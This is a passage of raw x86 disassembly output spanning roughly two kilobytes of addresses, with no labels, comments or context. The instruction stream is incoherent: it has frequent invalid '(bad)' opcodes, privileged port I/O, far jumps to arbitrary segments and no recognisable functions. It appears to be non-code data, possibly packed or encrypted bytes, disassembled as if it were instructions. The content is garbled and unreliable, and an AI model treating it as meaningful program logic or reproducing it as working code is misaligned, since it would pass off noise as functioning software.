  4078e4:	dec    ecx
  4078e5:	push   es
  4078e6:	pop    es
  4078e7:	add    BYTE PTR [eax+edi*2],ah
  4078ea:	and    ch,dl
  4078ec:	icebp  
  4078ed:	lods   eax,DWORD PTR ds:[esi]
  4078ee:	push   ss
  4078ef:	adc    al,BYTE PTR [ebx]
  4078f1:	nop
  4078f2:	test   DWORD PTR [ebx],0x2977f17b
  4078f8:	hlt    
  4078f9:	dec    eax
  4078fa:	mov    DWORD PTR ds:0xc80a1628,edi
  407900:	enter  0x4921,0x60
  407904:	xchg   ebx,eax
  407905:	dec    esi
  407906:	or     DWORD PTR [edx],esi
  407908:	(bad)  
  40790a:	jns    0x4078f4
  40790c:	xor    DWORD PTR [ecx],eax
  40790e:	imul   eax,eax,0x4fdbbeb9
  407914:	push   edi
  407915:	int    0x65
  407917:	push   ss
  407918:	pop    ss
  407919:	adc    eax,0x3391eb4
  40791e:	pop    es
  40791f:	jl     0x407960
  407921:	les    edx,FWORD PTR [edx+0x5c15a504]
  407927:	jae    0x4078b7
  407929:	cwde   
  40792a:	rol    BYTE PTR [edi-0x61586ba7],1
  407930:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407931:	test   BYTE PTR [edi-0x22],0x57
  407935:	jno    0x407985
  407937:	or     ah,BYTE PTR [edi+0x105d5ab8]
  40793d:	mov    WORD PTR [eax+0x253fad99],ss
  407943:	jno    0x407951
  407945:	jle    0x40791c
  407947:	dec    esi
  407948:	push   0xb1a432b6
  40794d:	stc    
  40794e:	push   ss
  40794f:	jno    0x40791a
  407951:	bound  edx,QWORD PTR [eax+0x6e5c94e6]
  407957:	mov    ebx,esp
  407959:	cs cmp eax,0x52625cab
  40795f:	mov    cl,0x87
  407961:	retf   0x4e34
  407964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407965:	dec    esi
  407966:	adc    al,0xe8
  407968:	xor    BYTE PTR [ebp-0x76218167],dl
  40796e:	push   eax
  40796f:	pushw  0xffe2
  407972:	mov    ds:0x259ce703,al
  407977:	(bad)  [eax]
  407979:	pop    esp
  40797a:	and    eax,0xd3d03e9a
  40797f:	sub    DWORD PTR [ecx-0x50],ecx
  407982:	mov    eax,0x5c4588c5
  407987:	mov    edx,0x44ac7b3f
  40798c:	and    DWORD PTR [eax],0x13d5f06e
  407992:	pop    esp
  407993:	scas   al,BYTE PTR es:[edi]
  407994:	loop   0x4079eb
  407996:	lahf   
  407997:	mov    edi,0x6c886b71
  40799c:	mov    ebx,0xe0c1eb07
  4079a1:	pop    ebp
  4079a2:	sub    ch,ch
  4079a4:	addr16 in al,dx
  4079a6:	lahf   
  4079a7:	aad    0xf5
  4079a9:	xchg   esp,eax
  4079aa:	or     eax,0xb9032220
  4079af:	cmp    DWORD PTR [ecx-0x10],edx
  4079b2:	sbb    eax,ebx
  4079b4:	(bad)  
  4079b5:	mov    esp,DWORD PTR [eax+0x5a]
  4079b8:	dec    ecx
  4079b9:	ins    DWORD PTR es:[edi],dx
  4079ba:	adc    eax,0xc91435ee
  4079bf:	mov    edi,0x4340f05e
  4079c4:	shr    BYTE PTR [esi+0x1c0593e],cl
  4079ca:	call   0xbc927498
  4079cf:	push   esp
  4079d0:	gs inc ebx
  4079d2:	pop    eax
  4079d3:	stos   DWORD PTR es:[edi],eax
  4079d4:	rcl    BYTE PTR [ebx],cl
  4079d6:	or     DWORD PTR [eax],edx
  4079d8:	mov    ebp,0x19fa8b52
  4079dd:	mov    BYTE PTR [edi],ah
  4079df:	imul   eax,ebp,0x4d832596
  4079e5:	dec    esp
  4079e6:	repz lea eax,[edi+eiz*8]
  4079ea:	call   DWORD PTR [edi+edx*4+0x17]
  4079ee:	inc    edx
  4079ef:	pop    edx
  4079f0:	mov    cl,0x37
  4079f2:	sub    eax,0x2411f5f0
  4079f7:	loop   0x407a55
  4079f9:	xor    ebp,esi
  4079fb:	add    cl,BYTE PTR [edi]
  4079fd:	xchg   esp,eax
  4079fe:	mov    bh,0xde
  407a00:	add    cl,bh
  407a02:	jge    0x407a06
  407a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a05:	inc    ecx
  407a06:	sub    DWORD PTR [ebx],edx
  407a08:	mov    cl,0x9e
  407a0a:	fistp  WORD PTR [esi-0x72]
  407a0d:	fdiv   DWORD PTR [esp+edx*2]
  407a10:	loope  0x407a00
  407a12:	or     DWORD PTR ds:[eax],ebx
  407a15:	push   ebp
  407a16:	mov    bl,0xb2
  407a18:	and    BYTE PTR [edx+0x425f28cd],0x32
  407a1f:	rcr    BYTE PTR [edx-0x4c],0x9a
  407a23:	hlt    
  407a24:	ins    DWORD PTR es:[edi],dx
  407a25:	jg     0x407a4c
  407a27:	mov    eax,ds:0x66e53d87
  407a2c:	sub    DWORD PTR [ebx+0x7a],esp
  407a2f:	arpl   WORD PTR [ecx-0x47],sp
  407a32:	push   esp
  407a33:	pop    ds
  407a34:	mov    DWORD PTR [edi-0x2ac02b11],ebp
  407a3a:	mov    al,0x61
  407a3c:	mov    ds:0x3103d802,al
  407a41:	lea    edi,[edi-0x79bc0097]
  407a47:	push   cs
  407a48:	xor    eax,0x8b0dfe87
  407a4d:	adc    ebp,ebp
  407a4f:	ds xchg esi,eax
  407a51:	stc    
  407a52:	add    DWORD PTR [bx],edx
  407a55:	les    edi,FWORD PTR [esi+0x7d]
  407a58:	adc    BYTE PTR [ecx+0x6f8ab931],ah
  407a5e:	mov    esi,0xc18b19af
  407a63:	ret    0x7811
  407a66:	pop    ds
  407a67:	xchg   BYTE PTR [eax+ebx*8+0x6],bh
  407a6b:	loop   0x407ac3
  407a6d:	mov    edx,DWORD PTR [ebx]
  407a6f:	and    DWORD PTR [ebp-0x33f95ac0],ecx
  407a75:	repnz or DWORD PTR [ebx-0x1de96aa0],esp
  407a7c:	dec    edi
  407a7d:	inc    eax
  407a7e:	xchg   ecx,ebx
  407a80:	dec    edx
  407a81:	test   BYTE PTR ds:0x6d774095,dl
  407a87:	inc    edx
  407a88:	push   cs
  407a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a8a:	push   eax
  407a8b:	pushf  
  407a8c:	xchg   ebx,eax
  407a8d:	shr    ebx,0x28
  407a90:	scas   al,BYTE PTR es:[edi]
  407a91:	loopne 0x407af3
  407a93:	jnp    0x407a7c
  407a95:	dec    esp
  407a96:	mov    DWORD PTR [eax+0x2e],ebp
  407a99:	or     edi,DWORD PTR [esp+eax*2]
  407a9c:	dec    esp
  407a9d:	fidivr DWORD PTR ds:0xa0c6ce3d
  407aa3:	xor    al,0x9
  407aa5:	inc    eax
  407aa6:	push   ebx
  407aa7:	outs   dx,DWORD PTR ds:[esi]
  407aa8:	dec    ebx
  407aa9:	pushf  
  407aaa:	mov    ecx,0xb071fc12
  407aaf:	stos   BYTE PTR es:[edi],al
  407ab0:	mov    ebx,0xe5a7f03f
  407ab5:	imul   eax,DWORD PTR [edx],0x90da9dac
  407abb:	inc    eax
  407abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407abd:	cwde   
  407abe:	repnz cmp DWORD PTR [eax+0x36],edx
  407ac2:	adc    edx,esp
  407ac4:	push   ds
  407ac5:	sub    al,0x31
  407ac7:	inc    ebx
  407ac8:	daa    
  407ac9:	stos   DWORD PTR es:[edi],eax
  407aca:	mov    bl,0xca
  407acc:	jns    0x407a86
  407ace:	cmp    ebp,esp
  407ad0:	icebp  
  407ad1:	sub    al,0x88
  407ad3:	fcmovu st,st(3)
  407ad5:	sbb    eax,DWORD PTR [edx-0x21]
  407ad8:	sbb    ecx,ebx
  407ada:	iret   
  407adb:	les    ecx,FWORD PTR [esi-0x3cc53792]
  407ae1:	iret   
  407ae2:	pop    esp
  407ae3:	jl     0x407af9
  407ae5:	popa   
  407ae6:	aas    
  407ae7:	call   0xae03610a
  407aec:	fnsave [eax-0x42]
  407aef:	jo     0x407b50
  407af1:	imul   esp,DWORD PTR [esi+ecx*1+0x6b],0xffffffd0
  407af6:	out    0xac,al
  407af8:	cmp    bl,BYTE PTR [ecx-0x2fa8d048]
  407afe:	rcr    DWORD PTR [edx+0xc],cl
  407b01:	xchg   edi,eax
  407b02:	mov    dl,0xdc
  407b04:	retf   
  407b05:	loope  0x407a9e
  407b07:	or     DWORD PTR [ebx-0x4],0x31
  407b0b:	test   DWORD PTR [ecx+edi*1],ebx
  407b0e:	xor    DWORD PTR [ebp-0x58887667],eax
  407b14:	jnp    0x407b73
  407b16:	(bad)  
  407b17:	sti    
  407b18:	stc    
  407b19:	mov    WORD PTR [edx+0x4f],es
  407b1c:	cmp    DWORD PTR [ebp+0x55],ebp
  407b1f:	cmp    eax,0xe485e09f
  407b24:	xor    edi,DWORD PTR [esi+0x4f]
  407b27:	pop    edi
  407b28:	pushf  
  407b29:	pusha  
  407b2a:	and    dh,cl
  407b2c:	ror    dh,cl
  407b2e:	mov    esp,0xfdac7db2
  407b33:	rol    BYTE PTR [ebx+0x2c],cl
  407b36:	into   
  407b37:	adc    edx,esp
  407b39:	sbb    eax,0xf17a55a6
  407b3e:	call   0xd3aa:0x289b3769
  407b45:	push   0x3c0098bc
  407b4a:	mov    esi,0xc109f720
  407b4f:	(bad)  
  407b50:	nop
  407b51:	sub    al,0xb4
  407b53:	xchg   DWORD PTR [esi-0x5b],ebp
  407b56:	sbb    BYTE PTR [esi+0x62],al
  407b59:	or     bh,BYTE PTR [eax]
  407b5b:	inc    edx
  407b5c:	xor    esi,DWORD PTR [ebx+0x6ab1e1a3]
  407b62:	out    dx,eax
  407b63:	add    esp,DWORD PTR [esi-0x609fedd8]
  407b69:	loope  0x407bb7
  407b6b:	lds    esp,FWORD PTR [esi]
  407b6d:	outs   dx,BYTE PTR ds:[esi]
  407b6e:	sub    BYTE PTR [ebx-0x68],bh
  407b71:	ds out 0x84,al
  407b74:	pop    esi
  407b75:	push   es
  407b76:	mov    cl,0x44
  407b78:	mov    ebx,0x232ffc1c
  407b7d:	js     0x407ba7
  407b7f:	pop    DWORD PTR [ebp-0x56]
  407b82:	clc    
  407b83:	loope  0x407b39
  407b85:	(bad)  
  407b86:	test   BYTE PTR [ecx+eiz*2-0x75fdbc2a],0x97
  407b8e:	lods   eax,DWORD PTR ds:[esi]
  407b8f:	into   
  407b90:	dec    ecx
  407b91:	sub    edx,edx
  407b93:	je     0x407b62
  407b95:	or     edx,eax
  407b97:	ins    BYTE PTR es:[edi],dx
  407b98:	and    ah,BYTE PTR [esi+0x37]
  407b9b:	mov    ebx,0xb3f7f24b
  407ba0:	mov    BYTE PTR [ecx+eiz*4],bl
  407ba3:	lea    edx,[eax+0x5c]
  407ba6:	(bad)  
  407ba7:	jo     0x407b97
  407ba9:	test   dl,ah
  407bab:	test   bh,ch
  407bad:	pop    ebp
  407bae:	adc    BYTE PTR [esi-0x5320ad83],al
  407bb4:	xor    esi,DWORD PTR [ebx+0x52af4c08]
  407bba:	xchg   edx,eax
  407bbb:	inc    edx
  407bbc:	dec    esp
  407bbd:	sub    cl,ah
  407bbf:	mov    cl,0x59
  407bc1:	(bad)  
  407bc2:	loop   0x407c2c
  407bc4:	ins    BYTE PTR es:[edi],dx
  407bc5:	int3   
  407bc6:	add    al,0xee
  407bc8:	inc    ecx
  407bc9:	adc    DWORD PTR [edx+0x546ff79a],ebp
  407bcf:	out    dx,al
  407bd0:	sar    DWORD PTR [edi],0x9f
  407bd3:	and    BYTE PTR [ebx+esi*4],bh
  407bd6:	repz and cl,BYTE PTR [ebx]
  407bd9:	mov    edi,0x6ddda481
  407bde:	or     ebx,edx
  407be0:	(bad)  
  407be1:	loop   0x407be3
  407be3:	and    eax,ecx
  407be5:	ror    DWORD PTR [edx+0x49],cl
  407be8:	ret    
  407be9:	(bad)  
  407bea:	(bad)  
  407beb:	jo     0x407be7
  407bed:	xchg   BYTE PTR [eax-0x43afec1d],cl
  407bf3:	jg     0x407bac
  407bf5:	hlt    
  407bf6:	mov    ebp,DWORD PTR ds:0x6164e6d7
  407bfc:	sbb    edx,DWORD PTR [edx+0x6]
  407bff:	xchg   ebp,eax
  407c00:	in     eax,0x51
  407c02:	and    ecx,esi
  407c04:	or     al,dl
  407c06:	mov    al,ds:0x2de2c42
  407c0b:	sbb    eax,DWORD PTR [esi+edi*8+0x40]
  407c0f:	out    0x7a,al
  407c11:	loope  0x407bf5
  407c13:	rol    esi,0x5e
  407c16:	pop    ebx
  407c17:	add    cl,BYTE PTR [esi-0x43]
  407c1a:	inc    ecx
  407c1b:	mov    edx,0xd8d37944
  407c20:	mov    eax,0x31a390fe
  407c25:	loopne 0x407c8d
  407c27:	add    BYTE PTR [edx],ch
  407c29:	test   al,0xd8
  407c2b:	jb     0x407c0b
  407c2d:	sub    al,0x6b
  407c2f:	mov    edi,0xdc083ff0
  407c34:	push   edi
  407c35:	add    DWORD PTR [eax-0x3c],eax
  407c38:	jmp    0x282a9c50
  407c3d:	sti    
  407c3e:	adc    al,0xb
  407c40:	xchg   DWORD PTR [ecx],edi
  407c42:	std    
  407c43:	xor    bl,BYTE PTR [ebp-0x444be75b]
  407c49:	pop    es
  407c4a:	xchg   esi,eax
  407c4b:	adc    edx,0xfffffff7
  407c4e:	test   BYTE PTR ds:0xeda04998,dh
  407c54:	call   0x2787e7ba
  407c59:	jo     0x407c61
  407c5b:	fadd   st(6),st
  407c5d:	inc    edi
  407c5e:	clc    
  407c5f:	(bad)  
  407c60:	mov    ch,0xaf
  407c62:	sbb    eax,0x406d0b9d
  407c67:	xchg   DWORD PTR [esi],esp
  407c69:	pop    ebx
  407c6a:	mov    eax,ds:0x953b9831
  407c6f:	xchg   DWORD PTR [ebx+ebx*2-0x62],ebx
  407c73:	or     DWORD PTR [esi-0x6d],0x5f
  407c77:	push   ebp
  407c78:	leave  
  407c79:	xor    eax,0xe846b056
  407c7e:	push   ds
  407c7f:	push   ebp
  407c80:	cmp    eax,0xbc187181
  407c85:	sbb    bh,0xbc
  407c88:	push   eax
  407c89:	sub    ebp,DWORD PTR [eax+0x78]
  407c8c:	dec    edx
  407c8d:	mov    al,ds:0x9c217aa6
  407c92:	sub    eax,0x80d4c5d4
  407c97:	adc    ah,BYTE PTR [ebx+0x297b016e]
  407c9d:	dec    esp
  407c9e:	push   eax
  407c9f:	mov    ah,0x1a
  407ca1:	in     al,0xd3
  407ca3:	jmp    0xba4f:0x7cb04f17
  407caa:	jecxz  0x407cfb
  407cac:	retf   0x6272
  407caf:	into   
  407cb0:	xchg   esi,eax
  407cb1:	xor    eax,0x248cea7
  407cb6:	repz pop ebp
  407cb8:	mov    eax,ds:0x8c0e9b57
  407cbd:	adc    eax,0xa8ad6593
  407cc2:	push   esp
  407cc3:	cmp    DWORD PTR [ebx+0x6],edx
  407cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc7:	sub    eax,DWORD PTR [eax]
  407cc9:	cmc    
  407cca:	xchg   esi,eax
  407ccb:	ins    DWORD PTR es:[edi],dx
  407ccc:	lea    ebp,[edx-0x35]
  407ccf:	mov    al,0xb3
  407cd1:	xor    BYTE PTR [esi+0x45],0x93
  407cd5:	and    bl,BYTE PTR [edx+0x71]
  407cd8:	in     eax,0x26
  407cda:	cdq    
  407cdb:	shr    cl,cl
  407cdd:	sbb    ecx,DWORD PTR [edx]
  407cdf:	cld    
  407ce0:	call   0xa6f0c7d7
  407ce5:	mov    ss,WORD PTR [edi]
  407ce7:	jmp    0x1b841a4d
  407cec:	and    dl,BYTE PTR [eax]
  407cee:	mov    dl,0xb5
  407cf0:	adc    DWORD PTR [ecx-0x1c71369e],esp
  407cf6:	sub    BYTE PTR [ecx+edi*1-0x65],dl
  407cfa:	inc    eax
  407cfb:	mov    ch,0x90
  407cfd:	int3   
  407cfe:	mov    eax,ds:0x6986e299
  407d03:	adc    eax,0xaf81457a
  407d08:	stos   DWORD PTR es:[edi],eax
  407d09:	stc    
  407d0a:	mov    WORD PTR [edi-0x312d53e1],es
  407d10:	jne    0x407d85
  407d12:	lods   eax,DWORD PTR ds:[esi]
  407d14:	(bad)  
  407d15:	int3   
  407d16:	pop    esp
  407d17:	xchg   bx,ax
  407d19:	add    bh,BYTE PTR [edx+0x3d10e381]
  407d1f:	div    BYTE PTR [ebx+edi*8-0xa]
  407d23:	dec    ebx
  407d24:	cmp    al,0xff
  407d26:	test   eax,0x937e0091
  407d2b:	xchg   edi,eax
  407d2c:	sub    DWORD PTR [ebx-0x6e4845a2],ebp
  407d32:	rcr    DWORD PTR [ebp-0x73],cl
  407d35:	into   
  407d36:	sti    
  407d37:	dec    edi
  407d38:	(bad)  
  407d39:	aam    0x6b
  407d3b:	retf   
  407d3c:	xchg   dx,ax
  407d3e:	sahf   
  407d3f:	aaa    
  407d40:	shr    BYTE PTR [eax],cl
  407d42:	sub    al,BYTE PTR [edi]
  407d44:	std    
  407d45:	mov    al,ds:0xa418d99f
  407d4a:	adc    eax,0x2e931bb3
  407d4f:	dec    ecx
  407d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d51:	addr16 dec esp
  407d53:	cmp    BYTE PTR [edi-0x56],al
  407d56:	(bad)  
  407d58:	push   cs
  407d59:	ret    0x71bb
  407d5c:	mov    ss,WORD PTR [ebp+0x2e]
  407d5f:	nop
  407d60:	and    al,0x76
  407d62:	sub    BYTE PTR [ecx-0x57],0x3b
  407d66:	mov    esi,DWORD PTR [esi+edi*4-0x63]
  407d6a:	nop
  407d6b:	cmp    al,0xbf
  407d6d:	add    DWORD PTR [ebp+edx*2+0x6c14f62c],ebx
  407d74:	fidiv  WORD PTR [edx+edi*8-0x7b]
  407d78:	push   0x8
  407d7a:	mov    ch,BYTE PTR [ebx]
  407d7c:	in     al,dx
  407d7d:	mov    dl,0x33
  407d7f:	dec    edi
  407d80:	aas    
  407d81:	js     0x407d2e
  407d83:	push   esp
  407d84:	(bad)  
  407d85:	and    eax,0x2eac388c
  407d8a:	sbb    bl,BYTE PTR [esi]
  407d8c:	pop    eax
  407d8d:	push   eax
  407d8e:	stos   DWORD PTR es:[edi],eax
  407d8f:	mov    esi,0x4bcdfab6
  407d94:	(bad)  
  407d95:	retf   0xa5d1
  407d98:	dec    edi
  407d99:	mov    al,0x9c
  407d9b:	cmc    
  407d9c:	das    
  407d9d:	aad    0x44
  407d9f:	mov    WORD PTR [ebx-0x525e005a],fs
  407da5:	jmp    0x6477:0x766808c8
  407dac:	enter  0x31d,0x4c
  407db0:	cmp    bh,BYTE PTR [ecx+0x17]
  407db3:	push   edx
  407db4:	popa   
  407db5:	lahf   
  407db6:	push   esp
  407db7:	out    dx,eax
  407db8:	call   0x2a5d:0x4536cfa0
  407dbf:	(bad)  
  407dc0:	iret   
  407dc1:	in     eax,dx
  407dc2:	les    eax,FWORD PTR [ebx+edi*8]
  407dc5:	enter  0x45ad,0x3e
  407dc9:	inc    esi
  407dca:	jbe    0x407dfc
  407dcc:	fadd   QWORD PTR [edx+0x7ecfcc7b]
  407dd2:	inc    esi
  407dd3:	jnp    0x407d84
  407dd5:	sbb    bl,BYTE PTR [ecx-0xa85095f]
  407ddb:	cli    
  407ddc:	xchg   esi,eax
  407ddd:	mov    eax,ds:0xf3e697e3
  407de2:	mov    ds:0xa5e3ea08,al
  407de7:	or     bl,BYTE PTR [edi+0xd38a3ac]
  407ded:	out    0xaa,eax
  407def:	inc    ebp
  407df0:	hlt    
  407df1:	dec    dl
  407df3:	mov    bl,0xd2
  407df5:	je     0x407d9d
  407df7:	(bad)  
  407df8:	mov    edi,0x6ad3f91e
  407dfd:	shl    BYTE PTR ds:0x36d36a89,1
  407e03:	in     eax,dx
  407e04:	mov    ecx,0x7e0c4ba4
  407e09:	cmp    DWORD PTR [eax+0x5d],esp
  407e0c:	adc    ah,BYTE PTR [ecx-0x2045d76c]
  407e12:	out    dx,al
  407e13:	push   ebx
  407e14:	scas   eax,DWORD PTR es:[edi]
  407e15:	(bad)  
  407e16:	ret    0x67f7
  407e19:	xchg   esp,eax
  407e1a:	push   ecx
  407e1b:	pop    ebp
  407e1c:	pop    ds
  407e1d:	inc    esi
  407e1e:	lods   al,BYTE PTR ds:[esi]
  407e1f:	sti    
  407e20:	fisttp QWORD PTR [esi-0x4fd375f1]
  407e26:	xlat   BYTE PTR ds:[ebx]
  407e27:	fbstp  TBYTE PTR [esi+0xf776a59]
  407e2d:	aaa    
  407e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e2f:	sbb    BYTE PTR [edx+0x70033071],bh
  407e35:	(bad)  
  407e36:	cmc    
  407e37:	call   0x91750e17
  407e3c:	mov    esp,0xf132949
  407e41:	xor    eax,0x8904a9b1
  407e46:	fiadd  WORD PTR [edx]
  407e48:	push   edx
  407e49:	xchg   esp,eax
  407e4a:	inc    esp
  407e4b:	in     al,0xc9
  407e4d:	(bad)  
  407e4e:	stc    
  407e4f:	pop    ebx
  407e50:	dec    ecx
  407e51:	mov    eax,ds:0x70af236c
  407e56:	jbe    0x407e57
  407e58:	sub    al,0x3c
  407e5a:	shr    DWORD PTR [esi+eiz*8],0xa
  407e5e:	mov    al,ds:0x66877128
  407e63:	(bad)  
  407e64:	mov    eax,0x78121113
  407e69:	jnp    0x407eb1
  407e6b:	mov    al,0xd8
  407e6d:	pop    eax
  407e6e:	jmp    0x3daf:0xa19159e1
  407e75:	jo     0x407e83
  407e77:	xchg   ecx,eax
  407e78:	mov    bl,BYTE PTR [ebx-0x7]
  407e7b:	inc    ecx
  407e7c:	addr16 mov eax,ds:0xf9cb
  407e80:	xchg   ebp,eax
  407e81:	(bad)  
  407e82:	lods   eax,DWORD PTR ds:[esi]
  407e83:	pop    ebp
  407e84:	sbb    eax,0x2c2da219
  407e89:	mov    dh,0xa2
  407e8b:	sub    al,0x28
  407e8d:	mov    edi,0xe0f85715
  407e92:	add    ah,BYTE PTR [ebp+0x23]
  407e95:	ins    BYTE PTR es:[edi],dx
  407e96:	xchg   BYTE PTR [edx],cl
  407e98:	(bad)  
  407e99:	out    0xbc,eax
  407e9b:	lds    esi,FWORD PTR [edx-0x79]
  407e9e:	(bad)  
  407e9f:	mov    edx,0x354bff76
  407ea4:	lea    ebp,ds:0x7e148692
  407eaa:	repnz sbb al,0xb7
  407ead:	push   eax
  407eae:	dec    edx
  407eaf:	xor    esi,DWORD PTR [ebp-0x361a307b]
  407eb5:	mov    ecx,0x79771f82
  407eba:	add    bl,dh
  407ebc:	pop    ecx
  407ebd:	sbb    dh,BYTE PTR [ebp-0x35]
  407ec0:	pop    ebx
  407ec1:	retf   
  407ec2:	in     al,dx
  407ec3:	ja     0x407e8b
  407ec5:	add    al,BYTE PTR [eax]
  407ec7:	ins    BYTE PTR es:[edi],dx
  407ec8:	repz idiv BYTE PTR [eax-0x6c]
  407ecc:	jecxz  0x407e62
  407ece:	nop
  407ecf:	leave  
  407ed0:	imul   DWORD PTR [eax]
  407ed2:	rdpmc  
  407ed4:	or     ecx,esi
  407ed6:	cwde   
  407ed7:	gs push edx
  407ed9:	stos   DWORD PTR es:[edi],eax
  407eda:	mov    bh,0x3c
  407edc:	mov    cs,WORD PTR [eax+ebp*1]
  407edf:	in     eax,dx
  407ee0:	add    eax,0x91e74e57
  407ee5:	mov    al,ds:0xed9d95d0
  407eea:	add    bl,BYTE PTR [edx-0x65448de1]
  407ef0:	lock push ds
  407ef2:	outs   dx,BYTE PTR ds:[esi]
  407ef3:	fld    QWORD PTR [ecx-0xf]
  407ef6:	cmp    al,0xc4
  407ef8:	and    DWORD PTR [ecx+0x0],ebp
  407efb:	ret    
  407efc:	clc    
  407efd:	int    0x96
  407eff:	jle    0x407f67
  407f01:	aad    0xa
  407f03:	sub    esi,esp
  407f05:	xor    DWORD PTR [ecx],eax
  407f07:	stos   DWORD PTR es:[edi],eax
  407f08:	push   eax
  407f09:	or     DWORD PTR [eax],edx
  407f0b:	mov    ebp,0xd4ef7dae
  407f10:	dec    esi
  407f11:	popa   
  407f12:	push   es
  407f13:	jecxz  0x407f85
  407f15:	mov    dl,0x15
  407f17:	mov    ebp,0x7684378f
  407f1c:	sbb    dl,BYTE PTR [eax+0x1b]
  407f1f:	or     ah,BYTE PTR [ebp-0x70]
  407f22:	pop    ebp
  407f23:	mov    bl,0xd8
  407f25:	mov    DWORD PTR [esi+0x768913e0],ebx
  407f2b:	ins    DWORD PTR es:[edi],dx
  407f2c:	jmp    0xf2c58477
  407f31:	jae    0x407eff
  407f33:	sub    eax,0x5d79df25
  407f38:	cwde   
  407f39:	int3   
  407f3a:	mov    ebp,0xeafb269b
  407f3f:	out    dx,eax
  407f40:	mov    ecx,0xff6d31c6
  407f45:	outs   dx,BYTE PTR ds:[esi]
  407f46:	push   cs
  407f47:	hlt    
  407f48:	fisttp DWORD PTR [edx]
  407f4a:	scas   eax,DWORD PTR es:[edi]
  407f4b:	inc    ecx
  407f4c:	lds    ebp,FWORD PTR [ecx-0x1d]
  407f4f:	push   edi
  407f50:	adc    al,BYTE PTR [edi]
  407f52:	xor    eax,0xe2ef436f
  407f57:	jno    0x407fab
  407f59:	out    dx,al
  407f5a:	sub    eax,0x278ade42
  407f5f:	(bad)  
  407f60:	lods   eax,DWORD PTR ds:[esi]
  407f61:	shr    BYTE PTR [edi+0x39],1
  407f64:	out    dx,al
  407f65:	push   cs
  407f66:	dec    ecx
  407f67:	daa    
  407f68:	addr16 dec esp
  407f6a:	loopne 0x407fb0
  407f6c:	push   0xffffffe5
  407f6e:	adc    al,0x81
  407f70:	out    0xb2,eax
  407f72:	ins    BYTE PTR es:[edi],dx
  407f73:	call   0xcdb:0x402374fb
  407f7a:	das    
  407f7b:	out    dx,al
  407f7c:	add    al,0xdc
  407f7e:	xor    dh,BYTE PTR [ecx+0x3c]
  407f81:	adc    eax,0x637bb8b4
  407f86:	and    ecx,DWORD PTR [ebp+ecx*1-0x1b]
  407f8a:	fistp  DWORD PTR [edx-0x98eb2e2]
  407f90:	xor    al,0x74
  407f92:	ror    BYTE PTR [edi+0x7b3bab9b],1
  407f98:	std    
  407f99:	pop    ds
  407f9a:	add    DWORD PTR [ebx-0x33e3b38],eax
  407fa0:	cmc    
  407fa1:	(bad)  
  407fa2:	fadd   QWORD PTR [edx+0x76]
  407fa5:	inc    esp
  407fa6:	jne    0x407fe2
  407fa8:	cmp    edx,0xffffffd1
  407fab:	arpl   WORD PTR [ebx-0x53],bp
  407fae:	dec    ecx
  407faf:	cld    
  407fb0:	sar    BYTE PTR [ebx-0x67],0x5
  407fb4:	or     eax,0x3cf96b81
  407fb9:	xchg   edx,eax
  407fba:	lea    esi,[ecx+0x4d95b96f]
  407fc0:	cmp    edx,DWORD PTR [edx+0x1a]
  407fc3:	mov    eax,0xdbcc8686
  407fc8:	aad    0x3f
  407fca:	repnz outs dx,DWORD PTR ds:[esi]
  407fcc:	push   ebx
  407fcd:	jnp    0x40803b
  407fcf:	(bad)  
  407fd0:	jle    0x408043
  407fd2:	gs ss sub ecx,edx
  407fd6:	xor    dh,dl
  407fd8:	enter  0x6d8b,0x79
  407fdc:	sub    DWORD PTR [ebp-0x7f],ebp
  407fdf:	retf   
  407fe0:	mov    ebx,0xfb5a5cb7
  407fe5:	addr16 dec ebp
  407fe7:	mov    WORD PTR [esi+0x23],?
  407fea:	scas   eax,DWORD PTR es:[edi]
  407feb:	cwde   
  407fec:	in     al,0x71
  407fee:	retf   0x89be
  407ff1:	outs   dx,DWORD PTR ds:[esi]
  407ff2:	hlt    
  407ff3:	push   esi
  407ff4:	sbb    DWORD PTR [eax],0x375fd4ff
  407ffa:	or     ecx,DWORD PTR [edx]
  407ffc:	shr    DWORD PTR [edi+eiz*8],cl
  407fff:	arpl   WORD PTR [ebp+0x23],bx
  408002:	ss mov esp,0x57c3c4be
  408008:	add    al,0xf5
  40800a:	dec    esp
  40800b:	mov    ebp,0x80ab0685
  408010:	push   ss
  408011:	jge    0x407fdf
  408013:	push   0xbcebadfe
  408018:	cwde   
  408019:	ret    
  40801a:	mov    DWORD PTR [edx-0x49],edx
  40801d:	mov    eax,0x2211096
  408022:	sub    al,0xe4
  408024:	mov    edx,0x96bcce8e
  408029:	call   0x7451:0x6de4c0c8
  408030:	ins    BYTE PTR es:[edi],dx
  408031:	aad    0x1e
  408033:	dec    edi
  408034:	cld    
  408035:	pop    ebx
  408036:	(bad)  
  408037:	lods   eax,DWORD PTR ds:[esi]
  408038:	jno    0x408018
  40803a:	test   al,0xde
  40803c:	imul   edx,esi,0x2
  40803f:	iret   
  408040:	dec    ebp
  408041:	xlat   BYTE PTR ds:[ebx]
  408042:	sahf   
  408043:	jnp    0x4080a1
  408045:	jp     0x4080c4
  408047:	nop
  408048:	fdivr  st,st(2)
  40804a:	sbb    bh,BYTE PTR [edx+0x33]
  40804d:	stc    
  40804e:	push   0xbc3704b5
  408053:	cmp    bh,BYTE PTR [edx]
  408055:	mov    ds,WORD PTR ds:0xa97df1a2
  40805b:	and    al,0x1f
  40805d:	mov    bl,0x5e
  40805f:	aam    0x65
  408061:	sbb    ebp,ebx
  408063:	adc    eax,DWORD PTR [ebp+0x63d6af53]
  408069:	test   ch,ch
  40806b:	and    eax,0xbee8be06
  408070:	inc    esp
  408071:	push   esp
  408072:	adc    eax,0xf8790860
  408077:	sbb    al,0x26
  408079:	retf   0xe217
  40807c:	nop
  40807d:	add    eax,0x479a6e61
  408082:	sahf   
  408083:	sbb    ebx,DWORD PTR [ebp+ecx*8-0x3ad40755]
  40808a:	aad    0xa6
  40808c:	mov    ds:0x36d5b9f1,eax
  408091:	inc    ebp
  408092:	or     eax,0xf65f86fd
  408097:	or     eax,0x30f7c315
  40809c:	cmp    BYTE PTR [edx-0x23],dh
  40809f:	xchg   ecx,edi
  4080a1:	data16 test al,0xe3
